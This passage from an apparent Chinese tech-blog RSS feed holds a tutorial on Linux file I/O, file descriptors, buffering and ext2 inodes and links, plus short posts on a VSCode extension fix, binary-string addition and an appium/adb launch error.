does not exist.  Output is always appended to the end of the file.  POSIXis silent on what the initial read position is when using this mode.  For glibc, the initial file position for reading is at the beginning of  the  file,  butfor Android/BSD/MacOS, the initial file position for reading is at the end of the file.翻译后为 :1. r  :  打开文件进行阅读, 流位于文件的开头.2. r+  :  打开读写模拟. 流处于文件的开头位置3,  w  :  文件截断为零长度或创建用于写入的文本文件, 流被置于文件的开头4. w+  :  打开文件以供读写, 如果文件不存在, 则创建它; 否则将其截断. 流的位置将设置为文件的开头.5. a  :  文件处于可追加状态 (可以在文件末尾写入数据). 如果文件不存在, 则创建该文件, 流处于文件末尾的位置.6. a+  :  用于读取和追加文件 (在文件末尾写入数据), 如果文件不存在, 则会创建文件, 输出始终被追加到文件的末尾2. 系统文件IO操作文件，除了上述C接口（当然，C++也有接口，其他语言也有），我们还可以采用系统接口来进行文件访问， 先来直接以代码的形式，实现和上面一模一样的代码hello.c写文件#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;int main()
{umask(0);int fd = open("myfile", O_WRONLY|O_CREAT, 0644);if(fd &lt; 0){perror("open");return 1;}int count = 5;const char *msg = "hello world!\n";int len = strlen(msg);while(count--){write(fd, msg, len);}close(fd);return 0;
}umask(0)：设置进程的文件模式创建掩码为 0。这意味着后续创建的文件将使用其指定的权限，不受默认掩码的影响。通常情况下，系统会有一个默认的掩码，设置为 0 可以确保文件创建时使用的权限为0644。(可以看到最后我们创建的文件是rw r r, 也就是我们要求的0644)open函数用于打开文件。第一个参数 "myfile" 是要打开或创建的文件名。第二个参数是打开模式，这里使用了两个标志：O_WRONLY：以只写模式打开文件。O_CREAT：如果文件不存在，则创建一个新文件。这里我使用 | 或起来, 也就以只写模式打开文件, 文件如果不存在就创建一新个文件.第三个参数 0644 是文件权限，仅在文件创建时有效。它表示：所有者具有读写权限（6），同组用户具有读权限（4），其他用户也具有读权限（4）。fd 是返回的文件描述符。如果打开失败，返回值将为负数。write(fd, msg, len);：第一个参数 fd 是文件描述符。第二个参数 msg 是要写入的内容。第三个参数 len 是要写入的字节数。结果展示:hello.c读文件#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;int main()
{int fd = open("myfile", O_RDONLY);if(fd &lt; 0) {perror("open");return 1;}const char* msg = "hello world!\n";char buf[1024];while(1){size_t s = read(fd, buf, strlen(msg));if(s &gt; 0) printf("%s", buf);else break;}close(fd);return 0;
}open函数用于打开文件。第一个参数 "myfile" 是要打开的文件名。第二个参数 O_RDONLY 表示以只读模式打开文件。fd 是返回的文件描述符。如果打开失败，返回值将为负数。size_t s = read(fd, buf, strlen(msg));：使用 read 函数从文件描述符 fd 读取数据。第一个参数 fd 是文件描述符。第二个参数 buf 是用来存储读取数据的缓冲区。第三个参数是 strlen(msg)，即读取 msg 字符串的长度（12 字节）。if(s &gt; 0)：检查返回的字节数 s 是否大于 0。如果大于 0，表示成功读取了数据。printf("%s", buf);：将缓冲区 buf 中的数据打印到标准输出。结果展示:系统接口介绍open需要的头文件:#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;方法:int open(const char *pathname, int flags);
int open(const char *pathname, int flags, mode_t mode);pathname: 要打开或创建的目标文件flags: 打开文件时，可以传入多个参数选项，用下面的一个或者多个常量进行“或”运算，构成flags。参数:O_RDONLY :只读打开O_WRONLY:只写打开O_RDWR :读，写打开这三个常量，必须指定一个且只能指定一个O_CREAT :若文件不存在，则创建它。需要使用mode选项，来指明新文件的访问权限O_APPEND:追加写返回值成功 : 新打开的文件描述符失败 : -1open 函数具体使用哪个，和具体应用场景相关，如目标文件不存在，需要open创建，则第三个参数表示创建文件 的默认权限,否则，使用两个参数的open。write, read, close, 了seek, 类比c文件相关接口~系统调用和库函数上面的 fopen fclose fread fwrite 都是C标准库当中的函数，我们称之为库函数（libc）。而， open close read write lseek 都属于系统提供的接口，称之为系统调用接口如下图所示:系统调用接口和库函数的关系，一目了然。所以，可以认为，f#系列的函数，都是对系统调用的封装，方便二次开发。3. 文件描述符fd通过对open函数的学习，我们知道了文件描述符就是一个小整数0 &amp; 1 &amp; 2Linux进程默认情况下会有3个缺省打开的文件描述符，分别是标准输入0， 标准输出1， 标准错误2.0,1,2对应的物理设备一般是：键盘，显示器，显示器所以输入输出还可以采用如下方式：#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;int main()
{char buf[1024];size_t s = read(0, buf, sizeof(buf));if(s &gt; 0){buf[s] = 0;write(1, buf, strlen(buf));write(2, buf, strlen(buf));}return 0;
}read(0, buf, sizeof(buf));：使用 read 函数从标准输入（文件描述符 0）读取数据。第一个参数 0 表示从标准输入读取。第二个参数 buf 是用于存储读取数据的缓冲区。第三个参数 sizeof(buf) 表示读取的最大字节数（即 1024 字节）。write(1, buf, strlen(buf));：使用 write 函数将 buf 中的数据写入标准输出（文件描述符 1）。strlen(buf) 计算 buf 中的字符串长度，以确保写入的字节数正确。write(2, buf, strlen(buf));：同样使用 write 函数将 buf 中的数据写入标准错误（文件描述符 2）。注意：标准输出和标准错误是两个不同的输出流，通常在终端中显示在同一位置，但在文件重定向时，可以分开处理。结果展示:文件系统结构初步了解根据以上我们的分析, 可以得到文件系统的初步结构, 如下图:而现在知道，文件描述符就是从0开始的小整数。当我们打开文件时，操作系统在内存中要创建相应的数据结构来描述目标文件。于是就有了file结构体。表示一个已经打开的文件对象。而进程执行open系统调用，所以必须让进程和文件关联起来。每个进程都有一个指针*files, 指向一张表files_struct,该表最重要的部分就是包涵一个指针数组，每个元素都是一个指向打开文件的指针！所以，本质上，文件描述符就是该数组的下标。所以，只要拿着文件描述符，就可以找到对应的文件!~文件描述符的分配规则代码示例:#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;int main()
{int fd = open("myfile", O_RDONLY);if(fd &lt; 0){perror("open");return 1;}printf("fd: %d\n", fd);close(fd);return 0;
}输出发现是 fd: 3关闭0或者2，在看:#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;int main()
{close(0);int fd = open("myfile", O_RDONLY);if(fd &lt; 0){perror("open");return 1;}printf("fd: %d\n", fd);close(fd);return 0;
}#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;int main()
{close(2);int fd = open("myfile", O_RDONLY);if(fd &lt; 0){perror("open");return 1;}printf("fd: %d\n", fd);close(fd);return 0;
}发现是结果是： fd: 0 或者 fd 2 可见，文件描述符的分配规则：在files_struct数组当中，找到当前没有被使用的 最小的一个下标，作为新的文件描述符.重定向那如果关闭1呢？看代码：#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;int main()
{close(1);int fd = open("myfile", O_WRONLY | O_CREAT, 00644);if (fd &lt; 0){perror("open");return 1;}printf("fd: %d\n", fd);fflush(stdout);close(fd);exit(0);
}此时，我们发现，本来应该输出到显示器上的内容，输出到了文件 myfile 当中，其中，fd＝1。这种现象叫做输出重定向。常见的重定向有:&gt;, &gt;&gt;, &lt;例如:1. &gt; (输出重定向)&gt; 符号用于将命令的标准输出重定向文件, 如果文件已经存在, 则会被覆盖 (如果目标文件已经存在, 则其内容会被覆盖~~)2. &gt;&gt; (追加重定向)&gt;&gt; 符号用于将命令的标准输出追加到文件的末尾, 如果目标文件不存在, 则会创建该文件3. &lt; (输入重定向)&lt; 符号用于将文件的内容作为命令的标准输入, 它可以将文件的内容传递给命令, 而不是从键盘输入~4. FILE结构体因为IO相关函数与系统调用接口对应，并且库函数封装系统调用，所以本质上，访问文件都是通过fd访问的。 所以C库当中的FILE结构体内部，必定封装了fd来段代码在研究一下：#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;#include &lt;string.h&gt;int main()
{const char* msg0 = "hello printf\n";const char* msg1 = "hello fwrite\n";const char* msg2 = "hello write\n";printf("%s", msg0);fwrite(msg1, strlen(msg1), 1, stdout);write(1, msg2, strlen(msg2));fork();return 0;
}运行出结果：但如果对进程实现输出重定向呢？ ./hello &gt; file ， 我们发现结果变成了:我们发现 printf 和 fwrite （库函数）都输出了2次，而 write 只输出了一次（系统调用）。为什么呢？肯定和 fork有关！一般C库函数写入文件时是全缓冲的，而写入显示器是行缓冲。printf fwrite 库函数会自带缓冲区，当发生重定向到普通文件时，数据的缓冲方式由行缓冲变成了全缓冲。而我们放在缓冲区中的数据，就不会被立即刷新，甚至fork之后但是进程退出之后，会统一刷新，写入文件当中。但是fork的时候，父子数据会发生写时拷贝，所以当你父进程准备刷新的时候，子进程也就有了同样的 一份数据，随即产生两份数据。write 没有变化，说明没有所谓的缓冲综上：printf fwrite 库函数会自带缓冲区，而 write 系统调用没有带缓冲区。另外，我们这里所说的缓冲区， 都是用户级缓冲区。其实为了提升整机性能，OS也会提供相关内核级缓冲区，不过不再我们讨论范围之内。那这个缓冲区谁提供呢？ printf fwrite 是库函数， write 是系统调用，库函数在系统调用的“上层”， 是对系统 调用的“封装”，但是 write 没有缓冲区，而 printf fwrite 有，足以说明，该缓冲区是二次加上的，又因为是 C，所以由C标准库提供5. 理解文件系统经过上面的铺垫, 现在我们正式认识一下LinuxOS下的文件系统:我们使用ls -l的时候看到的除了看到文件名，还看到了文件元数据每行包含7列:1. 模式 2. 硬链接数 3. 文件所有者 4, 组 5, 大小 6. 最后修改时间 7. 文件名ls -l读取存储在磁盘上的文件信息，然后显示出来其实这个信息除了通过这种方式来读取，还有一个stat命令能够看到更多信息我们可以看到text.c文件上面有Inode, 为了能解释清楚inode我们先简单了解一下文件系统Linux ext2文件系统如下图所示:Linux ext2文件系统，上图为磁盘文件系统图（内核内存映像肯定有所不同），磁盘是典型的块设备，硬盘分区被划分为一个个的block。一个block的大小是由格式化的时候确定的，并且不可以更改。例如mke2fs的-b选项可以设 定block大小为1024、2048或4096字节。而上图中启动块（Boot Block）的大小是确定的，对上面名词的解释:1. Block Group：ext2文件系统会根据分区的大小划分为数个Block Group。而每个Block Group都有着相同的结构组成。政府管理各区的例子2. 超级块（Super Block）：存放文件系统本身的结构信息。记录的信息主要有：bolck 和 inode的总量， 未使用的block和inode的数量，一个block和inode的大小，最近一次挂载的时间，最近一次写入数据的时间，最近一次检验磁盘的时间等其他文件系统的相关信息。Super Block的信息被破坏，可以说整个文件系统结构就被破坏了3. GDT，Group Descriptor Table：块组描述符，描述块组属性信息，有兴趣的同学可以在了解一下4. 块位图（Block Bitmap）：Block Bitmap中记录着Data Block中哪个数据块已经被占用，哪个数据块没有被占用5. inode位图（inode Bitmap）：每个bit表示一个inode是否空闲可用。6. i节点表:存放文件属性 如文件大小，所有者，最近修改时间等7. 数据区：存放文件内容将属性和数据分开存放的想法看起来很简单，但实际上是如何工作的呢？我们通过touch一个新文件来看看如何工作。创建一个新文件主要有一下4个操作:1. 存储属性 内核先找到一个空闲的i节点（这里是528160）。内核把文件信息记录到其中。 2. 存储数据 该文件需要存储在三个磁盘块，内核找到了三个空闲块：300, 500, 800。将内核缓冲区的第一块数据复制到300，下一块复制到500，以此类推。3. 记录分配情况 文件内容按顺序300,500,800存放。内核在inode上的磁盘分布区记录了上述块列表。4. 添加文件名到目录新的文件名abc。linux如何在当前的目录中记录这个文件？内核将入口（528160，abc）添加到目录文件。文件名和inode之间的对应关系将文件名和文件的内容及属性连接起来。文件名和inode编号具有映射关系!!1. 一个目录下不能建立同名文件2. 查找文件的顺序 : 文件名 -&gt; inode编号总结 :文件 = 内容 + 属性(也是数据)文件在磁盘存储 本质是: 文件的内容 + 文件的属性数据Linux文件系统特定: 文件内容 和 文件属性 分开存储找到指定的文件 -&gt; 文件所在目录(目录也是文件) -&gt; 根据文件名 -&gt;(映射) inode -&gt; 目标文件硬链接我们看到，真正找到磁盘上文件的并不是文件名，而是inode。 其实在linux中可以让多个文件名对应于同一个 inode。abc和def的链接状态完全相同，他们被称为指向文件的硬链接。内核记录了这个连接数，inode 528160的硬连接数为2。我们在删除文件时干了两件事情：1.在目录中将对应的记录删除，2.将硬连接数-1，如果为0，则将对应的磁盘释放。总结 : 硬链接不是一个独立的文件, 因为你没有独立的inode number, 你用的是目标文件的inode硬链接就是一个文件名和inode的映射关系, 建立硬链接, 就是在指定目录下, 添加一个新的文件名和inode number的映射关系!硬链接的应用:任何一个目录, 刚开始新建的时候, 引用计数一定是2:目录1内部, 新建一个目录, 会让1目录的引用计数自动+1, 一个目录内部有几个目录 : 1引用计数-2所以我们可以使用cd .. cd .进行路径访问总结:数据冗余：在不占用额外空间的情况下创建多个引用。保护数据：如果删除了某个硬链接，文件内容仍然存在，只要还有其他硬链接指向该 inode。(一般常用硬链接做备份)方便访问：可以使用不同的名字或路径访问同一个文件。软连接硬链接是通过inode引用另外一个文件，软链接是通过名字引用另外一个文件，在shell中的做法为:软链接是一种指向另一个文件路径的引用，类似于 Windows 系统中的快捷方式。它包含原始文件的路径信息，而不是直接指向文件数据。(所以大家别再认为删除桌面快捷方式就是把软件彻底删除了, 实际上你删除是它的软连接而已, 里面只有它的路径, 没有数据)软连接的应用:总结 :简化路径：使用软链接可以简化复杂路径的访问。(快捷方式)文件版本管理：可以为不同版本的文件创建软链接，方便切换。跨文件系统的引用：可以在不同文件系统之间链接文件。http://www.ppmy.cn/news/1540853.html相关文章VSCode创建插件HelloWorld找不到指令解决办法按照网上的教程执行yo code并且生成成功  但是F5打开调试新窗口后&amp;#xff0c;ctrl  shift  P&amp;#xff0c;输入helloworld并没有指令提示  原因&amp;#xff1a;当前电脑安装的VSCode版本过低&amp;#xff0c;不支持当前插件的使用&amp;#xff08;因为自动生成的插件总是默认使用最新版VSC…阅读更多...字符串(3)_二进制求和_高精度加法个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 字符串(3)_二进制求和_高精度加法 收录于专栏【经典算法练习】 本专栏旨在分享学习算法的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c;  目…阅读更多...appium启动hbuild打包的apk异常解决目录 一、错误信息 
二、问题解决 
2.1 通过以下命令获取安装包名称&amp;#xff1a; 
2.2 这个launcher状态下的安装包名称和active&amp;#xff0c;替换原先的安装包名称 一、错误信息 
通过adb shell dumpsys activity | findstr "mResume" 命令获取的安装包信息&amp;#xff…阅读更多...4.计算机网络_TCP可靠与效率 
TCP的主要特点&amp;#xff1a; 
TCP是面向连接的运输层协议&amp;#xff0c;每一条TCP连接只能有两个端点&amp;#xff0c;即&amp;#xff1a;点对点、一对一形式。每一个端口都是一个socket。TCP提供可靠交付的服务TCP提供全双工通信&amp;#xff0c;因为TCP的收发缓冲区是分开的。TC…阅读更多...大数据-169 Elasticsearch 索引使用 与 架构概念 增删改查点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...scrapy 鲜花数据爬虫之【上】图片下载本项目仅供学习之用 
1 爬虫开发 
利用scrapy工程编写爬取鲜花数据的爬虫&amp;#xff0c;本次的目标是先下载相关的图片&amp;#xff0c;要下载图片首先要获取到的就是图片的链接&amp;#xff0c;爬虫的编写如下&amp;#xff1a; 
class FlowerSpider(scrapy.Spider):name  flowerallowed_doma…阅读更多...【AI学习】Anthropic公司CEO Dario Amodei最近发表的文章《Machines of Loving Grace：AI如何让世界变得更好》Anthropic公司CEO Dario Amodei最近发表的文章。通过翻译工具&amp;#xff0c;大概看了看&amp;#xff0c;未来非常美好&amp;#xff01; 只是生物学和身体健康 、神经科学和心理健康这两部分的前景&amp;#xff0c;就非常让人兴奋&amp;#xff01; 
Machines of Loving Grace 
How AI Could Transf…阅读更多...Lua条件语句软考鸭微信小程序 过软考,来软考鸭! 提供软考免费软考讲解视频、题库、软考试题、软考模考、软考查分、软考咨询等服务 在Lua编程语言中&amp;#xff0c;条件语句是控制程序执行流程的关键工具。它们允许开发者根据特定条件的真假来执行不同的代码块&amp;#xff0c;从而实现复杂的逻辑…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:28 +0000</pubDate>
    </item>
    <item>
      <title>VSCode创建插件HelloWorld找不到指令解决办法</title>
      <link>https://www.ppmy.cn/news/1540852.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维VSCode创建插件HelloWorld找不到指令解决办法news/2025/10/31 23:18:26/按照网上的教程执行yo code并且生成成功但是F5打开调试新窗口后，ctrl + shift + P，输入helloworld并没有指令提示原因：当前电脑安装的VSCode版本过低，不支持当前插件的使用（因为自动生成的插件总是默认使用最新版VSCode），所以需要将插件使用的VSCode版本降低。即package.json中的engines.vscode版本不能高于本电脑安装的VSCode版本。再次执行yarn，下载所需的@types/vscode，如果没有自己VSCode软件对应的@types/vscode，则需要下载版本略低于VSCode软件的@types/vscode等下载成功后，再次运行调试窗口，则可以看到指令正确执行！http://www.ppmy.cn/news/1540852.html相关文章字符串(3)_二进制求和_高精度加法个人主页&amp;#xff1a;C忠实粉丝 欢迎 点赞&amp;#x1f44d; 收藏✨ 留言✉ 加关注&amp;#x1f493;本文由 C忠实粉丝 原创 字符串(3)_二进制求和_高精度加法 收录于专栏【经典算法练习】 本专栏旨在分享学习算法的一点学习笔记&amp;#xff0c;欢迎大家在评论区交流讨论&amp;#x1f48c;  目…阅读更多...appium启动hbuild打包的apk异常解决目录 一、错误信息 
二、问题解决 
2.1 通过以下命令获取安装包名称&amp;#xff1a; 
2.2 这个launcher状态下的安装包名称和active&amp;#xff0c;替换原先的安装包名称 一、错误信息 
通过adb shell dumpsys activity | findstr "mResume" 命令获取的安装包信息&amp;#xff…阅读更多...4.计算机网络_TCP可靠与效率 
TCP的主要特点&amp;#xff1a; 
TCP是面向连接的运输层协议&amp;#xff0c;每一条TCP连接只能有两个端点&amp;#xff0c;即&amp;#xff1a;点对点、一对一形式。每一个端口都是一个socket。TCP提供可靠交付的服务TCP提供全双工通信&amp;#xff0c;因为TCP的收发缓冲区是分开的。TC…阅读更多...大数据-169 Elasticsearch 索引使用 与 架构概念 增删改查点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...scrapy 鲜花数据爬虫之【上】图片下载本项目仅供学习之用 
1 爬虫开发 
利用scrapy工程编写爬取鲜花数据的爬虫&amp;#xff0c;本次的目标是先下载相关的图片&amp;#xff0c;要下载图片首先要获取到的就是图片的链接&amp;#xff0c;爬虫的编写如下&amp;#xff1a; 
class FlowerSpider(scrapy.Spider):name  flowerallowed_doma…阅读更多...【AI学习】Anthropic公司CEO Dario Amodei最近发表的文章《Machines of Loving Grace：AI如何让世界变得更好》Anthropic公司CEO Dario Amodei最近发表的文章。通过翻译工具&amp;#xff0c;大概看了看&amp;#xff0c;未来非常美好&amp;#xff01; 只是生物学和身体健康 、神经科学和心理健康这两部分的前景&amp;#xff0c;就非常让人兴奋&amp;#xff01; 
Machines of Loving Grace 
How AI Could Transf…阅读更多...Lua条件语句软考鸭微信小程序 过软考,来软考鸭! 提供软考免费软考讲解视频、题库、软考试题、软考模考、软考查分、软考咨询等服务 在Lua编程语言中&amp;#xff0c;条件语句是控制程序执行流程的关键工具。它们允许开发者根据特定条件的真假来执行不同的代码块&amp;#xff0c;从而实现复杂的逻辑…阅读更多...【Golang】Gin框架：Go语言中的轻量级Web框架✨✨ 欢迎大家来到景天科技苑✨✨ 
&amp;#x1f388;&amp;#x1f388; 养成好习惯&amp;#xff0c;先赞后看哦~&amp;#x1f388;&amp;#x1f388; &amp;#x1f3c6; 作者简介&amp;#xff1a;景天科技苑 &amp;#x1f3c6;《头衔》&amp;#xff1a;大厂架构师&amp;#xff0c;华为云开发者社区专家博主&amp;#xff0c;…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:27 +0000</pubDate>
    </item>
    <item>
      <title>字符串(3)_二进制求和_高精度加法</title>
      <link>https://www.ppmy.cn/news/1540851.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维字符串(3)_二进制求和_高精度加法news/2025/10/31 23:18:26/个人主页：C++忠实粉丝欢迎 点赞👍 收藏✨ 留言✉ 加关注💓本文由 C++忠实粉丝 原创字符串(3)_二进制求和_高精度加法收录于专栏【经典算法练习】本专栏旨在分享学习算法的一点学习笔记，欢迎大家在评论区交流讨论💌目录1. 题目链接2. 题目描述3. 解法算法思路:代码展示:1. 题目链接OJ链接 :二进制求和https://blog.csdn.net/wer24_25/article/details/142949685?spm=1001.2014.3001.55022. 题目描述给你两个二进制字符串a和b，以二进制字符串的形式返回它们的和。示例 1：输入:a = "11", b = "1"输出："100"示例 2：输入：a = "1010", b = "1011"输出："10101"提示：1 &lt;= a.length, b.length &lt;= 104a和b仅由字符'0'或'1'组成字符串如果不是"0"，就不含前导零3. 解法算法思路:模拟十进制的大数相加的过程:模拟十进制中我们列竖式计算两个数之和的过程, 但是这里是二进制的求和, 我们不是逢十进一, 而是逢二进一.代码展示:class Solution {
public:string addBinary(string a, string b) {string ret;int n1 = a.size() - 1, n2 = b.size() - 1, t = 0;while(n1 &gt;= 0 || n2 &gt;= 0 || t){if(n1 &gt;= 0) t += a[n1--] - '0';if(n2 &gt;= 0) t += b[n2--] - '0';ret += t % 2 + '0';t /= 2;}reverse(ret.begin(), ret.end());return ret;}
};代码示例:http://www.ppmy.cn/news/1540851.html相关文章appium启动hbuild打包的apk异常解决目录 一、错误信息 
二、问题解决 
2.1 通过以下命令获取安装包名称&amp;#xff1a; 
2.2 这个launcher状态下的安装包名称和active&amp;#xff0c;替换原先的安装包名称 一、错误信息 
通过adb shell dumpsys activity | findstr "mResume" 命令获取的安装包信息&amp;#xff…阅读更多...4.计算机网络_TCP可靠与效率 
TCP的主要特点&amp;#xff1a; 
TCP是面向连接的运输层协议&amp;#xff0c;每一条TCP连接只能有两个端点&amp;#xff0c;即&amp;#xff1a;点对点、一对一形式。每一个端口都是一个socket。TCP提供可靠交付的服务TCP提供全双工通信&amp;#xff0c;因为TCP的收发缓冲区是分开的。TC…阅读更多...大数据-169 Elasticsearch 索引使用 与 架构概念 增删改查点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...scrapy 鲜花数据爬虫之【上】图片下载本项目仅供学习之用 
1 爬虫开发 
利用scrapy工程编写爬取鲜花数据的爬虫&amp;#xff0c;本次的目标是先下载相关的图片&amp;#xff0c;要下载图片首先要获取到的就是图片的链接&amp;#xff0c;爬虫的编写如下&amp;#xff1a; 
class FlowerSpider(scrapy.Spider):name  flowerallowed_doma…阅读更多...【AI学习】Anthropic公司CEO Dario Amodei最近发表的文章《Machines of Loving Grace：AI如何让世界变得更好》Anthropic公司CEO Dario Amodei最近发表的文章。通过翻译工具&amp;#xff0c;大概看了看&amp;#xff0c;未来非常美好&amp;#xff01; 只是生物学和身体健康 、神经科学和心理健康这两部分的前景&amp;#xff0c;就非常让人兴奋&amp;#xff01; 
Machines of Loving Grace 
How AI Could Transf…阅读更多...Lua条件语句软考鸭微信小程序 过软考,来软考鸭! 提供软考免费软考讲解视频、题库、软考试题、软考模考、软考查分、软考咨询等服务 在Lua编程语言中&amp;#xff0c;条件语句是控制程序执行流程的关键工具。它们允许开发者根据特定条件的真假来执行不同的代码块&amp;#xff0c;从而实现复杂的逻辑…阅读更多...【Golang】Gin框架：Go语言中的轻量级Web框架✨✨ 欢迎大家来到景天科技苑✨✨ 
&amp;#x1f388;&amp;#x1f388; 养成好习惯&amp;#xff0c;先赞后看哦~&amp;#x1f388;&amp;#x1f388; &amp;#x1f3c6; 作者简介&amp;#xff1a;景天科技苑 &amp;#x1f3c6;《头衔》&amp;#xff1a;大厂架构师&amp;#xff0c;华为云开发者社区专家博主&amp;#xff0c;…阅读更多...Centos安装Nginx 非Docker客户的机器属于 Centos7 系列&amp;#xff0c;由于其较为陈旧&amp;#xff0c;2024开始众多镜像和软件源都已失效。此篇文章将详细记录在 Centos7 操作系统上从零开始安装 Nginx 的整个流程。 
本文Nginx是安装在/usr/local/nginx下 
详细步骤如下&amp;#xff1a; 
准备Nginx安装包&amp;#x…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:26 +0000</pubDate>
    </item>
    <item>
      <title>appium启动hbuild打包的apk异常解决</title>
      <link>https://www.ppmy.cn/news/1540850.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维appium启动hbuild打包的apk异常解决news/2025/10/31 23:18:25/目录一、错误信息二、问题解决2.1 通过以下命令获取安装包名称：2.2 这个launcher状态下的安装包名称和active，替换原先的安装包名称一、错误信息通过adb shell dumpsys activity | findstr "mResume" 命令获取的安装包信息，用以下包名和activity：运行报一下异常：java.lang.SecurityException: Permission Denial: starting Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10200000 cmp=uni.UNIDCC1D16/io.dcloud.PandoraEntryActivity } from null (pid=3537, uid=2000) not exported from uid 10054二、问题解决2.1 通过以下命令获取安装包名称：adb shell am monitoradb shell dumpsys package uni.UNIDCC1D16   